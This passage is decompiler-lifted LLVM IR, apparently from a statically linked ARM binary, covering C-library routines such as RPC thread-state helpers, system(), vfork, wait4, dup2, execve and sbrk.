  %v3_2b6a0 = load i32, i32* @r4, align 4
  store i32 %v3_2b6a0, i32* %stack_var_-8, align 4
  %v0_2b6a4 = call i32 @__rpc_thread_variables()
  %v9_2b6b8 = icmp eq i32 %v0_2b6a4, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55712)
  br i1 %v9_2b6b8, label %bb8, label %bb

bb:                                               ; preds = %entry
  %v2_2b6bc = add i32 %v0_2b6a4, 148
  br label %.thread1

bb8:                                              ; preds = %entry
  %v5_2b6c4.pre = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 268) to i32*), align 4
  br label %.thread1

.thread1:                                         ; preds = %bb, %bb8
  %storemerge = phi i32 [ %v2_2b6bc, %bb ], [ %v5_2b6c4.pre, %bb8 ]
  %v2_2b6c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2b6c8, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_2b6dc = load i32, i32* @r4, align 4
  store i32 %v3_2b6dc, i32* %stack_var_-8, align 4
  %v0_2b6e0 = call i32 @__rpc_thread_variables()
  %v9_2b6f4 = icmp eq i32 %v0_2b6e0, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55712)
  br i1 %v9_2b6f4, label %bb9, label %bb

bb:                                               ; preds = %entry
  %v2_2b6f8 = add i32 %v0_2b6e0, 144
  br label %.thread2

bb9:                                              ; preds = %entry
  %v5_2b700.pre = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 280) to i32*), align 4
  br label %.thread2

.thread2:                                         ; preds = %bb, %bb9
  %storemerge = phi i32 [ %v2_2b6f8, %bb ], [ %v5_2b700.pre, %bb9 ]
  %v2_2b704 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2b704, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 144, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_2b718 = load i32, i32* @r4, align 4
  store i32 %v3_2b718, i32* %stack_var_-8, align 4
  %v0_2b71c = call i32 @__rpc_thread_variables()
  %v9_2b730 = icmp eq i32 %v0_2b71c, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55712)
  br i1 %v9_2b730, label %bb9, label %bb

bb:                                               ; preds = %entry
  %v2_2b734 = add i32 %v0_2b71c, 128
  br label %.thread2

bb9:                                              ; preds = %entry
  %v5_2b73c.pre = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 272) to i32*), align 4
  br label %.thread2

.thread2:                                         ; preds = %bb, %bb9
  %storemerge = phi i32 [ %v2_2b734, %bb ], [ %v5_2b73c.pre, %bb9 ]
  %v2_2b740 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2b740, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_2b754 = load i32, i32* @r4, align 4
  store i32 %v3_2b754, i32* %stack_var_-8, align 4
  %v0_2b758 = call i32 @__rpc_thread_variables()
  %v9_2b76c = icmp eq i32 %v0_2b758, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55712)
  br i1 %v9_2b76c, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v5_2b774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 228) to i32*), align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_2b77c = phi i32 [ %v0_2b758, %entry ], [ %v5_2b774, %bb ]
  %v2_2b778 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2b778, i32* @r4, align 4
  ret i32 %v1_2b77c

; uselistorder directives
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55712), { 2, 3, 4, 5, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__rpc_thread_destroy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v4_2b79c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 136) to i32*), align 4
  %v2_2b7a0 = icmp eq i32 %v4_2b79c, 0
  br i1 %v2_2b7a0, label %dec_label_pc_2b7c0, label %dec_label_pc_2b7ac

dec_label_pc_2b7ac:                               ; preds = %entry
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 178104, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2b79c)
  br label %dec_label_pc_2b7cc

dec_label_pc_2b7c0:                               ; preds = %entry
  %v4_2b7c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 88) to i32*), align 4
  %v1_2b7c8 = inttoptr i32 %v4_2b7c4 to i32*
  br label %dec_label_pc_2b7cc

dec_label_pc_2b7cc:                               ; preds = %dec_label_pc_2b7ac, %dec_label_pc_2b7c0
  %storemerge.in = phi i32* [ @r0, %dec_label_pc_2b7ac ], [ %v1_2b7c8, %dec_label_pc_2b7c0 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_2b7cc = icmp eq i32 %storemerge, 0
  br i1 %v2_2b7cc, label %dec_label_pc_2b854, label %dec_label_pc_2b7d4

dec_label_pc_2b7d4:                               ; preds = %dec_label_pc_2b7cc
  %v0_2b7d8 = load i32, i32* @r5, align 4
  %v2_2b7d8 = add i32 %v0_2b7d8, 55712
  %v9_2b7dc = icmp eq i32 %storemerge, %v2_2b7d8
  br i1 %v9_2b7dc, label %dec_label_pc_2b854, label %dec_label_pc_2b7e4

dec_label_pc_2b7e4:                               ; preds = %dec_label_pc_2b7d4
  %v0_2b7e4 = call i32 @__rpc_thread_svc_cleanup()
  store i32 %v0_2b7e4, i32* %r0.global-to-local, align 4
  %v1_2b7e8 = call i32 @__rpc_thread_clnt_cleanup(i32 %v0_2b7e4)
  store i32 %v1_2b7e8, i32* %r0.global-to-local, align 4
  %v0_2b7ec = load i32, i32* @r4, align 4
  %v1_2b7ec = add i32 %v0_2b7ec, 152
  %v2_2b7ec = inttoptr i32 %v1_2b7ec to i32*
  %v3_2b7ec = load i32, i32* %v2_2b7ec, align 4
  store i32 %v3_2b7ec, i32* @r0, align 4
  %v0_2b7f0 = call i32 @free()
  store i32 %v0_2b7f0, i32* %r0.global-to-local, align 4
  %v0_2b7f4 = load i32, i32* @r4, align 4
  %v1_2b7f4 = add i32 %v0_2b7f4, 156
  %v2_2b7f4 = inttoptr i32 %v1_2b7f4 to i32*
  %v3_2b7f4 = load i32, i32* %v2_2b7f4, align 4
  store i32 %v3_2b7f4, i32* @r0, align 4
  %v0_2b7f8 = call i32 @free()
  store i32 %v0_2b7f8, i32* %r0.global-to-local, align 4
  %v0_2b7fc = load i32, i32* @r4, align 4
  %v1_2b7fc = add i32 %v0_2b7fc, 160
  %v2_2b7fc = inttoptr i32 %v1_2b7fc to i32*
  %v3_2b7fc = load i32, i32* %v2_2b7fc, align 4
  store i32 %v3_2b7fc, i32* @r0, align 4
  %v0_2b800 = call i32 @free()
  store i32 %v0_2b800, i32* %r0.global-to-local, align 4
  %v0_2b804 = load i32, i32* @r4, align 4
  %v1_2b804 = add i32 %v0_2b804, 188
  %v2_2b804 = inttoptr i32 %v1_2b804 to i32*
  %v3_2b804 = load i32, i32* %v2_2b804, align 4
  store i32 %v3_2b804, i32* @r0, align 4
  %v0_2b808 = call i32 @free()
  store i32 %v0_2b808, i32* %r0.global-to-local, align 4
  %v0_2b80c = load i32, i32* @r4, align 4
  %v1_2b80c = add i32 %v0_2b80c, 172
  %v2_2b80c = inttoptr i32 %v1_2b80c to i32*
  %v3_2b80c = load i32, i32* %v2_2b80c, align 4
  store i32 %v3_2b80c, i32* @r0, align 4
  %v0_2b810 = call i32 @free()
  store i32 %v0_2b810, i32* %r0.global-to-local, align 4
  %v0_2b814 = load i32, i32* @r4, align 4
  %v1_2b814 = add i32 %v0_2b814, 176
  %v2_2b814 = inttoptr i32 %v1_2b814 to i32*
  %v3_2b814 = load i32, i32* %v2_2b814, align 4
  store i32 %v3_2b814, i32* @r0, align 4
  %v0_2b818 = call i32 @free()
  %v0_2b81c = load i32, i32* @r4, align 4
  store i32 %v0_2b81c, i32* @r0, align 4
  %v0_2b820 = call i32 @free()
  store i32 %v0_2b820, i32* %r0.global-to-local, align 4
  %v0_2b828 = load i32, i32* @r5, align 4
  %v2_2b828 = add i32 %v0_2b828, 160
  %v3_2b828 = inttoptr i32 %v2_2b828 to i32*
  %v4_2b828 = load i32, i32* %v3_2b828, align 4
  %v2_2b82c = icmp eq i32 %v4_2b828, 0
  br i1 %v2_2b82c, label %dec_label_pc_2b848, label %dec_label_pc_2b834

dec_label_pc_2b834:                               ; preds = %dec_label_pc_2b7e4
  store i32 2, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2b828)
  br label %dec_label_pc_2b854

dec_label_pc_2b848:                               ; preds = %dec_label_pc_2b7e4
  %v2_2b84c = add i32 %v0_2b828, 88
  %v3_2b84c = inttoptr i32 %v2_2b84c to i32*
  %v4_2b84c = load i32, i32* %v3_2b84c, align 4
  %v2_2b850 = inttoptr i32 %v4_2b84c to i32*
  store i32 0, i32* %v2_2b850, align 4
  br label %dec_label_pc_2b854

dec_label_pc_2b854:                               ; preds = %dec_label_pc_2b7d4, %dec_label_pc_2b7cc, %dec_label_pc_2b834, %dec_label_pc_2b848
  %v1_2b85c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2b85c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 9, 1, 2, 3, 4, 5, 6, 8, 7, 11, 10, 0 }
  uselistorder i32 172, { 5, 0, 2, 3, 1, 4 }
  uselistorder i32 188, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_2b854, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_2b7cc, { 1, 0 }
}

define i32 @function_2b864(i32 %arg1) local_unnamed_addr {
dec_label_pc_2b864:
  %v0_2b864 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2b864, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2b864
  %v2_2b864 = load i32, i32* @r8, align 4
  %v4_2b864 = mul i32 %v2_2b864, 2
  %v5_2b864 = and i32 %v4_2b864, %arg1
  %v8_2b868 = ashr i32 %v2_2b864, %v5_2b864
  %v9_2b868 = and i32 %v8_2b868, %v5_2b864
  %v5_2b870 = udiv i32 %v9_2b868, 2
  %v6_2b870 = and i32 %v5_2b870, %v9_2b868
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2b864, %bb
  %v7_2b870 = phi i32 [ %arg1, %dec_label_pc_2b864 ], [ %v6_2b870, %bb ]
  ret i32 %v7_2b870

; uselistorder directives
  uselistorder i32 %v9_2b868, { 1, 0 }
  uselistorder i32 %v2_2b864, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_2b880 = load i32, i32* %r0.global-to-local, align 4
  %v2_2b880 = icmp eq i32 %v0_2b880, 0
  br i1 %v2_2b880, label %bb, label %dec_label_pc_2b898

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2b9b4

dec_label_pc_2b898:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_2b8a0 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_2b8b0 = call i32 @bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_2b8c0 = call i32 @bsd_signal(i32 17, i32 0)
  store i32 %v2_2b8c0, i32* @r0, align 4
  %v0_2b8c8 = call i32 @__vfork()
  store i32 %v0_2b8c8, i32* %r0.global-to-local, align 4
  store i32 %v0_2b8c8, i32* @r4, align 4
  %v1_2b8cc = icmp slt i32 %v0_2b8c8, 0
  br i1 %v1_2b8cc, label %dec_label_pc_2b8d4, label %dec_label_pc_2b900

dec_label_pc_2b8d4:                               ; preds = %dec_label_pc_2b898
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_2b8dc = call i32 @bsd_signal(i32 3, i32 %v2_2b8a0)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_2b8e8 = call i32 @bsd_signal(i32 2, i32 %v2_2b8b0)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_2b8f4 = call i32 @bsd_signal(i32 17, i32 %v2_2b8c0)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2b9b4

dec_label_pc_2b900:                               ; preds = %dec_label_pc_2b898
  %v2_2b8cc = icmp eq i32 %v0_2b8c8, 0
  br i1 %v2_2b8cc, label %dec_label_pc_2b904, label %dec_label_pc_2b958

dec_label_pc_2b904:                               ; preds = %dec_label_pc_2b900
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_2b90c = call i32 @bsd_signal(i32 3, i32 0)
  %v0_2b910 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_2b918 = call i32 @bsd_signal(i32 2, i32 %v0_2b910)
  %v0_2b91c = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_2b924 = call i32 @bsd_signal(i32 17, i32 %v0_2b91c)
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39500), i32* %r0.global-to-local, align 4
  %v0_2b948 = load i32, i32* @r4, align 4
  %v5_2b94c = call i32 @execl(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39500), i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39492), i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39488), i32 %v0_2b880, i32 %v0_2b948)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_2b954 = call i32 @__GI__exit(i32 127)
  store i32 %v1_2b954, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2b958

dec_label_pc_2b958:                               ; preds = %dec_label_pc_2b900, %dec_label_pc_2b904
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_2b960 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_2b96c = call i32 @bsd_signal(i32 2, i32 1)
  %v2_2b978 = ptrtoint i32* %stack_var_-12 to i32
  %v0_2b97c = load i32, i32* @r4, align 4
  store i32 %v0_2b97c, i32* %r0.global-to-local, align 4
  %v2_2b980 = call i32 @wait4(i32 %v0_2b97c, i32 %v2_2b978)
  store i32 %v2_2b980, i32* %r0.global-to-local, align 4
  %v7_2b984 = icmp eq i32 %v2_2b980, -1
  br i1 %v7_2b984, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_2b958
  store i32 %v2_2b980, i32* %stack_var_-12, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_2b958, %bb11
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_2b994 = call i32 @bsd_signal(i32 3, i32 %v2_2b8a0)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_2b9a0 = call i32 @bsd_signal(i32 2, i32 %v2_2b8b0)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_2b9ac = call i32 @bsd_signal(i32 17, i32 %v2_2b8c0)
  %v3_2b9b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_2b9b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2b9b4

dec_label_pc_2b9b4:                               ; preds = %bb, %dec_label_pc_2b8d4, %bb12
  %v1_2b9bc = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_2b8d4 ], [ %v3_2b9b0, %bb12 ]
  ret i32 %v1_2b9bc

; uselistorder directives
  uselistorder i32 %v2_2b980, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 11, 10, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 0, 1 }
  uselistorder i32 (i32)* @__GI__exit, { 4, 1, 8, 12, 0, 11, 10, 9, 3, 2, 7, 6, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39488), { 0, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39500), { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_2b9b4, { 2, 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_2b958, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_2b9d0 = load i32, i32* @r4, align 4
  store i32 %v3_2b9d0, i32* %stack_var_-8, align 4
  %v0_2b9d4 = load i32, i32* @r0, align 4
  %v0_2b9d8 = call i32 @__GI___errno_location()
  %v1_2b9dc = sub i32 0, %v0_2b9d4
  %v2_2b9e0 = inttoptr i32 %v0_2b9d8 to i32*
  store i32 %v1_2b9dc, i32* %v2_2b9e0, align 4
  %v2_2b9e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2b9e8, i32* @r4, align 4
  ret i32 -1
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_2b9f0 = load i32, i32* @r0, align 4
  ret i32 %v1_2b9f0
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_2b9f4 = load i32, i32* @r0, align 4
  ret i32 %v1_2b9f4
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_2b9f8 = load i32, i32* @r0, align 4
  ret i32 %v1_2b9f8
}

define i32 @__longjmp(i32* %arg1) local_unnamed_addr {
entry:
  %v0_2ba00 = load i32, i32* @r1, align 4
  %v2_2ba00 = icmp eq i32 %v0_2ba00, 0
  br i1 %v2_2ba00, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_2ba0c = phi i32 [ %v0_2ba00, %entry ], [ 1, %bb ]
  ret i32 %v1_2ba0c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_2ba20 = load i32, i32* @r0, align 4
  %v2_2ba20 = icmp ugt i32 %v0_2ba20, -4097
  br i1 %v2_2ba20, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_2ba20

bb1:                                              ; preds = %entry
  %v4_2ba2c = icmp eq i32 %v0_2ba20, -38
  br i1 %v4_2ba2c, label %dec_label_pc_2ba34, label %bb2

dec_label_pc_2ba34:                               ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_2ba34, %bb1
  %v0_2ba4c = call i32 @__syscall_error()
  ret i32 %v0_2ba4c
}

define i32 @wait4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2ba50 = load i32, i32* @r7, align 4
  store i32 %v3_2ba50, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_2ba78, label %dec_label_pc_2ba68

dec_label_pc_2ba68:                               ; preds = %entry
  %v0_2ba68 = call i32 @__GI___errno_location()
  %v0_2ba6c = load i32, i32* %r7.global-to-local, align 4
  %v1_2ba6c = sub i32 0, %v0_2ba6c
  %v2_2ba70 = inttoptr i32 %v0_2ba68 to i32*
  store i32 %v1_2ba6c, i32* %v2_2ba70, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_2ba7c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2ba78

dec_label_pc_2ba78:                               ; preds = %entry, %dec_label_pc_2ba68
  %v2_2ba7c = phi i32 [ %v3_2ba50, %entry ], [ %v2_2ba7c.pre, %dec_label_pc_2ba68 ]
  %v0_2ba78 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_2ba68 ]
  store i32 %v2_2ba7c, i32* @r7, align 4
  ret i32 %v0_2ba78

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2ba78, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2ba84 = load i32, i32* @r7, align 4
  store i32 %v3_2ba84, i32* %stack_var_-8, align 4
  %v0_2ba90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2ba90, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2ba90, -4095
  br i1 %tmp, label %dec_label_pc_2bab0, label %dec_label_pc_2baa0

dec_label_pc_2baa0:                               ; preds = %entry
  %v0_2baa0 = call i32 @__GI___errno_location()
  %v0_2baa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_2baa4 = sub i32 0, %v0_2baa4
  %v2_2baa8 = inttoptr i32 %v0_2baa0 to i32*
  store i32 %v1_2baa4, i32* %v2_2baa8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_2bab0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2bab0

dec_label_pc_2bab0:                               ; preds = %entry, %dec_label_pc_2baa0
  %v1_2bab4 = phi i32 [ %v0_2ba90, %entry ], [ -1, %dec_label_pc_2baa0 ]
  %v2_2bab0 = phi i32 [ %v3_2ba84, %entry ], [ %v2_2bab0.pre, %dec_label_pc_2baa0 ]
  store i32 %v2_2bab0, i32* @r7, align 4
  ret i32 %v1_2bab4

; uselistorder directives
  uselistorder i32 %v0_2ba90, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2bab0, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2bab8 = load i32, i32* @r7, align 4
  store i32 %v3_2bab8, i32* %stack_var_-8, align 4
  %v0_2bac4 = load i32, i32* @r0, align 4
  store i32 %v0_2bac4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2bac4, -4095
  br i1 %tmp, label %dec_label_pc_2bae4, label %dec_label_pc_2bad4

dec_label_pc_2bad4:                               ; preds = %entry
  %v0_2bad4 = call i32 @__GI___errno_location()
  %v0_2bad8 = load i32, i32* %r7.global-to-local, align 4
  %v1_2bad8 = sub i32 0, %v0_2bad8
  %v2_2badc = inttoptr i32 %v0_2bad4 to i32*
  store i32 %v1_2bad8, i32* %v2_2badc, align 4
  %v2_2bae4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2bae4

dec_label_pc_2bae4:                               ; preds = %entry, %dec_label_pc_2bad4
  %v1_2bae8 = phi i32 [ %v0_2bac4, %entry ], [ -1, %dec_label_pc_2bad4 ]
  %v2_2bae4 = phi i32 [ %v3_2bab8, %entry ], [ %v2_2bae4.pre, %dec_label_pc_2bad4 ]
  store i32 %v2_2bae4, i32* %r7.global-to-local, align 4
  ret i32 %v1_2bae8

; uselistorder directives
  uselistorder i32 %v0_2bac4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2bae4, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_2bafc = load i32, i32* @r0, align 4
  ret i32 %v1_2bafc
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2bb00 = load i32, i32* @r7, align 4
  store i32 %v3_2bb00, i32* %stack_var_-8, align 4
  %v0_2bb0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2bb0c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2bb0c, -4095
  br i1 %tmp, label %dec_label_pc_2bb2c, label %dec_label_pc_2bb1c

dec_label_pc_2bb1c:                               ; preds = %entry
  %v0_2bb1c = call i32 @__GI___errno_location()
  %v0_2bb20 = load i32, i32* %r7.global-to-local, align 4
  %v1_2bb20 = sub i32 0, %v0_2bb20
  %v2_2bb24 = inttoptr i32 %v0_2bb1c to i32*
  store i32 %v1_2bb20, i32* %v2_2bb24, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_2bb2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2bb2c

dec_label_pc_2bb2c:                               ; preds = %entry, %dec_label_pc_2bb1c
  %v1_2bb30 = phi i32 [ %v0_2bb0c, %entry ], [ -1, %dec_label_pc_2bb1c ]
  %v2_2bb2c = phi i32 [ %v3_2bb00, %entry ], [ %v2_2bb2c.pre, %dec_label_pc_2bb1c ]
  store i32 %v2_2bb2c, i32* %r7.global-to-local, align 4
  ret i32 %v1_2bb30

; uselistorder directives
  uselistorder i32 %v0_2bb0c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2bb2c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_2bb44 = load i32, i32* @r0, align 4
  ret i32 %v1_2bb44
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_2bb48 = load i32, i32* @r4, align 4
  store i32 %v3_2bb48, i32* %stack_var_-16, align 4
  store i32 55988, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r4.global-to-local, align 4
  %v4_2bb58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55988) to i32*), align 4
  %v2_2bb5c = icmp eq i32 %v4_2bb58, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_2bb5c, label %dec_label_pc_2bb68, label %dec_label_pc_2bb78

dec_label_pc_2bb68:                               ; preds = %entry
  %v1_2bb6c = call i32 @__GI_brk(i32 0)
  %v1_2bb70 = icmp slt i32 %v1_2bb6c, 0
  br i1 %v1_2bb70, label %dec_label_pc_2bb9c, label %dec_label_pc_2bb78thread-pre-split

dec_label_pc_2bb78thread-pre-split:               ; preds = %dec_label_pc_2bb68
  %v0_2bb7c.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_2bb78.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2bb78.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2bb78

dec_label_pc_2bb78:                               ; preds = %dec_label_pc_2bb78thread-pre-split, %entry
  %v1_2bb78 = phi i32 [ %v1_2bb78.pre, %dec_label_pc_2bb78thread-pre-split ], [ 55988, %entry ]
  %v0_2bb78 = phi i32 [ %v0_2bb78.pre, %dec_label_pc_2bb78thread-pre-split ], [ ptrtoint (i32* @global_var_44990.1184 to i32), %entry ]
  %v1_2bb8c = phi i32 [ %v0_2bb7c.pr, %dec_label_pc_2bb78thread-pre-split ], [ %arg1, %entry ]
  %v2_2bb78 = add i32 %v0_2bb78, %v1_2bb78
  %v3_2bb78 = inttoptr i32 %v2_2bb78 to i32*
  %v4_2bb78 = load i32, i32* %v3_2bb78, align 4
  %v2_2bb7c = icmp eq i32 %v1_2bb8c, 0
  store i32 %v4_2bb78, i32* %r4.global-to-local, align 4
  br i1 %v2_2bb7c, label %dec_label_pc_2bba0, label %dec_label_pc_2bb88

dec_label_pc_2bb88:                               ; preds = %dec_label_pc_2bb78
  %v2_2bb8c = add i32 %v4_2bb78, %v1_2bb8c
  %v1_2bb90 = call i32 @__GI_brk(i32 %v2_2bb8c)
  %v1_2bb94 = icmp slt i32 %v1_2bb90, 0
  br i1 %v1_2bb94, label %dec_label_pc_2bb9c, label %dec_label_pc_2bb88.dec_label_pc_2bba0_crit_edge

dec_label_pc_2bb88.dec_label_pc_2bba0_crit_edge:  ; preds = %dec_label_pc_2bb88
  %v0_2bba0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2bba0

dec_label_pc_2bb9c:                               ; preds = %dec_label_pc_2bb88, %dec_label_pc_2bb68
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2bba0

